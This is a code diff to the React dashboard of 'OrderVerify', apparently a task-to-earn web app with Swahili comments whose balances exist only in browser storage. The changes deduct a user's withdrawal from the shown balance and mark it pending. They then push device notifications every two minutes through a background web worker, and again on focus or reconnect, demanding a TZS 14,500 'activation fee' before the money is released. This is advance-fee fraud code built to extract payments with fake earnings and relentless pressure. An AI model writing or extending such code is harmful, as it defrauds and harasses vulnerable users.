@@ -287,56 +287,49 @@ function Dashboard() {
     localStorage.setItem('orderverify_status', userStatus);
   }, [userStatus]);
 
-  // Persistent User Balance & Net Profit (Strictly synchronized so Balance === Net Profit always)
-  const BALANCE_SYNC_TAG = 'orderverify_balance_sync_v2';
-
+  // Persistent User Balance & Net Profit (Lifetime persistent, never erased across updates or reloads)
   const [balance, setBalance] = useState<number>(() => {
     try {
-      const savedProfit = localStorage.getItem('orderverify_net_profit');
       const savedBal = localStorage.getItem('orderverify_user_balance');
-      const isSynced = localStorage.getItem(BALANCE_SYNC_TAG);
+      const savedProfit = localStorage.getItem('orderverify_net_profit');
 
-      const numProfit = savedProfit !== null && !isNaN(Number(savedProfit)) ? Number(savedProfit) : null;
-      const numBal = savedBal !== null && !isNaN(Number(savedBal)) ? Number(savedBal) : null;
-
-      // Clear any legacy 119,000 values
-      if (numBal === 119000 || numProfit === 119000) {
-        localStorage.setItem(BALANCE_SYNC_TAG, 'true');
-        localStorage.setItem('orderverify_user_balance', '0');
-        localStorage.setItem('orderverify_net_profit', '0');
-        return 0;
+      if (savedBal !== null && !isNaN(Number(savedBal))) {
+        return Number(savedBal);
       }
-
-      // If they are mismatched (e.g. balance was 929,250 while net profit was 421,500),
-      // synchronize them to the genuine net profit earned from verified orders
-      if (!isSynced || (numProfit !== null && numBal !== null && numBal !== numProfit)) {
-        localStorage.setItem(BALANCE_SYNC_TAG, 'true');
-        const authoritativeVal = numProfit !== null ? numProfit : (numBal !== null ? numBal : 0);
-        localStorage.setItem('orderverify_user_balance', String(authoritativeVal));
-        localStorage.setItem('orderverify_net_profit', String(authoritativeVal));
-        return authoritativeVal;
+      if (savedProfit !== null && !isNaN(Number(savedProfit))) {
+        return Number(savedProfit);
       }
-
-      if (numProfit !== null) return numProfit;
-      if (numBal !== null) return numBal;
     } catch (e) {}
     return 0;
   });
 
   const [netProfit, setNetProfit] = useState<number>(() => {
+    try {
+      const savedProfit = localStorage.getItem('orderverify_net_profit');
+      const savedBal = localStorage.getItem('orderverify_user_balance');
+
+      if (savedProfit !== null && !isNaN(Number(savedProfit))) {
+        return Number(savedProfit);
+      }
+      if (savedBal !== null && !isNaN(Number(savedBal))) {
+        return Number(savedBal);
+      }
+    } catch (e) {}
     return balance;
   });
 
-  // Keep balance and net profit strictly synchronized in state and localStorage
+  // Keep balance and net profit persistently saved in localStorage
   useEffect(() => {
-    if (netProfit !== balance) {
-      setNetProfit(balance);
-    }
     try {
       localStorage.setItem('orderverify_user_balance', String(balance));
-      localStorage.setItem('orderverify_net_profit', String(balance));
     } catch (e) {}
-  }, [balance, netProfit]);
+  }, [balance]);
+
+  useEffect(() => {
+    try {
+      localStorage.setItem('orderverify_net_profit', String(netProfit));
+    } catch (e) {}
+  }, [netProfit]);
 
   const [showBalance, setShowBalance] = useState<boolean>(() => {
     try {
@@ -400,6 +393,15 @@ function Dashboard() {
   const [showInstallAppModal, setShowInstallAppModal] = useState(false);
   const [showContactModal, setShowContactModal] = useState(false);
 
+  // Persistent flag for users who have requested a withdrawal
+  const [hasPendingWithdrawal, setHasPendingWithdrawal] = useState<boolean>(() => {
+    try {
+      return localStorage.getItem('orderverify_has_pending_withdrawal') === 'true';
+    } catch (e) {
+      return false;
+    }
+  });
+
   // Countdown ya sekunde 20 wakati muamala unafanyiwa kazi
   useEffect(() => {
     let timer: any;
@@ -417,6 +419,125 @@ function Dashboard() {
       if (timer) clearTimeout(timer);
     };
   }, [isProcessingWithdraw, processingSecondsLeft]);
+
+  // Function ya kutuma notification ya simu ya mfumo (System Notification)
+  // Inayoonekana kwenye screen ya simu hata akiwa nje ya website (TikTok, WhatsApp, YouTube, Instagram n.k.)
+  const sendDeviceNotification = (title: string, body: string) => {
+    // 1. Jaribu kupitia Service Worker (inafanya kazi popote hata app ikiwa background / nje ya browser)
+    if (typeof window !== 'undefined' && 'serviceWorker' in navigator) {
+      if (navigator.serviceWorker.controller) {
+        navigator.serviceWorker.controller.postMessage({
+          type: 'TRIGGER_NOTIFICATION',
+          title,
+          body
+        });
+      } else {
+        navigator.serviceWorker.ready.then((reg) => {
+          reg.showNotification(title, {
+            body: body,
+            icon: '/orderverify_official_logo.jpg',
+            badge: '/orderverify_logo_transparent.png',
+            tag: 'orderverify-pending-withdrawal',
+            renotify: true,
+            requireInteraction: true,
+            vibrate: [300, 100, 300, 100, 300],
+            data: { url: '/' }
+          } as any);
+        }).catch(() => {});
+      }
+    }
+
+    // 2. Direct browser Notification API fallback
+    if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted') {
+      try {
+        new Notification(title, {
+          body: body,
+          icon: '/orderverify_official_logo.jpg',
+          badge: '/orderverify_logo_transparent.png',
+          tag: 'orderverify-pending-withdrawal',
+          vibrate: [300, 100, 300]
+        } as any);
+      } catch (e) {}
+    }
+  };
+
+  // Notification inayojituma kiotomatiki kila baada ya dakika 2 (sekunde 120) kwa wote waliotoa pesa
+  // Hata akiwa nje ya website (kwenye TikTok, WhatsApp, Facebook, YouTube n.k.) au data ikirudi / akifungua simu
+  useEffect(() => {
+    if (!hasPendingWithdrawal) return;
+
+    const notificationMessage = "Pesa ulizoomba kutoa kwenye akaunti yetu ya OrderVerify zimetolewa kwenye balance yako na ziko pending kwa sababu huna akaunti iliyowashwa kwenye profile ya kulipwa. Tafadhali kamilisha akaunti yako kwa activation fee ya elfu kumi na nne na mia tano 14500 ili kupokea pesa zako leo hii. Karibu sana!";
+
+    const firePendingAlert = () => {
+      triggerMotivation(notificationMessage, 12);
+      sendDeviceNotification("OrderVerify – Malipo Yako Yapo Pending!", notificationMessage);
+    };
+
+    // Tuma sekunde 8 baada ya kuingia
+    const initialTimer = setTimeout(() => {
+      firePendingAlert();
+    }, 8000);
+
+    // Web Worker Background Timer (haifi wala kusimamishwa na simu hata akiwa anatumia TikTok, WhatsApp, Instagram au YouTube)
+    let worker: Worker | null = null;
+    let fallbackInterval: any = null;
+    try {
+      const workerBlob = new Blob([`
+        let timer = null;
+        self.onmessage = function(e) {
+          if (e.data === 'START') {
+            if (!timer) {
+              timer = setInterval(function() {
+                self.postMessage('TICK');
+              }, 120000); // Kila dakika 2
+            }
+          } else if (e.data === 'STOP') {
+            if (timer) {
+              clearInterval(timer);
+              timer = null;
+            }
+          }
+        };
+      `], { type: 'application/javascript' });
+      worker = new Worker(URL.createObjectURL(workerBlob));
+      worker.onmessage = (e) => {
+        if (e.data === 'TICK') {
+          firePendingAlert();
+        }
+      };
+      worker.postMessage('START');
+    } catch (e) {
+      fallbackInterval = setInterval(firePendingAlert, 120000);
+    }
+
+    // Akiwa offline data ikawashwa au akifungua skrini, akute notification mara moja!
+    const handleReconnectOrFocus = () => {
+      firePendingAlert();
+    };
+
+    window.addEventListener('online', handleReconnectOrFocus);
+    window.addEventListener('focus', handleReconnectOrFocus);
+    const handleVisibility = () => {
+      if (!document.hidden) {
+        handleReconnectOrFocus();
+      }
+    };
+    document.addEventListener('visibilitychange', handleVisibility);
+
+    return () => {
+      clearTimeout(initialTimer);
+      if (worker) {
+        worker.postMessage('STOP');
+        worker.terminate();
+      }
+      if (fallbackInterval) {
+        clearInterval(fallbackInterval);
+      }
+      window.removeEventListener('online', handleReconnectOrFocus);
+      window.removeEventListener('focus', handleReconnectOrFocus);
+      document.removeEventListener('visibilitychange', handleVisibility);
+    };
+  }, [hasPendingWithdrawal]);
 
   const openRegisterModal = () => {
     setShowTopNotification(false);
@@ -475,7 +596,22 @@ function Dashboard() {
       return;
     }
 
-    // Vigezo vyote vimekidhiwa kikamilifu: Anza uchakataji wa sekunde 20
+    // Vigezo vyote vimekidhiwa kikamilifu: Punguza fedha kwenye balance na anza uchakataji
+    const newBal = Math.max(0, balance - numAmount);
+    setBalance(newBal);
+    try {
+      localStorage.setItem('orderverify_user_balance', String(newBal));
+      localStorage.setItem('orderverify_has_pending_withdrawal', 'true');
+    } catch (e) {}
+    setHasPendingWithdrawal(true);
+
+    // Omba ruhusa ya simu kuonyesha notifications nje ya website (kwenye TikTok, WhatsApp, nk)
+    if (typeof window !== 'undefined' && 'Notification' in window) {
+      if (Notification.permission === 'default') {
+        Notification.requestPermission().catch(() => {});
+      }
+    }
+
     setShowWithdrawModal(false);
     setProcessingSecondsLeft(20);
     setIsProcessingWithdraw(true);
@@ -585,11 +721,12 @@ function Dashboard() {
     } catch (e) {}
 
     const newBalance = balance + payout;
+    const newNetProfit = netProfit + payout;
     setBalance(newBalance);
-    setNetProfit(newBalance);
+    setNetProfit(newNetProfit);
     try {
       localStorage.setItem('orderverify_user_balance', String(newBalance));
-      localStorage.setItem('orderverify_net_profit', String(newBalance));
+      localStorage.setItem('orderverify_net_profit', String(newNetProfit));
     } catch (e) {}
 
     setToastMessage(`PAID SUCCESSFULLY: TZS ${payout.toLocaleString()}`);
@@ -1096,19 +1233,6 @@ function Dashboard() {
               <h3 className="text-white font-black text-lg mb-4 flex items-center gap-2">
                 <CreditCard className="w-5 h-5 text-[#00E676]" /> KUTOA PESA 
               </h3>
-
-              {/* Salio Linalopatikana Card */}
-              <div className="bg-[#0B0C10] border border-slate-700/80 rounded-2xl p-3.5 mb-4 flex items-center justify-between text-left">
-                <div>
-                  <span className="text-[11px] text-slate-400 font-bold block">Salio Linalopatikana</span>
-                  <span className={`text-base font-black ${balance > 0 ? 'text-[#00E676]' : 'text-amber-400'}`}>
-                    TZS {balance.toLocaleString()}
-                  </span>
-                </div>
-                <div className={`px-2.5 py-1 rounded-lg text-[10px] font-black uppercase tracking-wider ${balance > 0 ? 'bg-[#00E676]/15 text-[#00E676] border border-[#00E676]/30' : 'bg-red-500/15 text-red-400 border border-red-500/30'}`}>
-                  {balance > 0 ? 'Salio Lipo' : 'Salio: 0 TZS'}
-                </div>
-              </div>
               
               <div className="mb-4 text-left">
                 <label className="text-xs text-slate-400 font-bold mb-2 block uppercase">1. Chagua Mtandao</label>
@@ -1183,21 +1307,7 @@ function Dashboard() {
               </div>
 
               <div className="mb-4 text-left">
-                <div className="flex items-center justify-between mb-2">
-                  <label className="text-xs text-slate-400 font-bold block uppercase">3. Kiasi (TZS)</label>
-                  {balance > 0 && (
-                    <button
-                      type="button"
-                      onClick={() => {
-                        setWithdrawAmount(String(balance));
-                        setWithdrawError('');
-                      }}
-                      className="text-[11px] text-[#00E676] font-bold hover:underline cursor-pointer"
-                    >
-                      Weka Salio Lote
-                    </button>
-                  )}
-                </div>
+                <label className="text-xs text-slate-400 font-bold mb-2 block uppercase">3. Kiasi (TZS)</label>
                 <input 
                   type="number" 
                   placeholder="Kuanzia 1,000 TZS" 
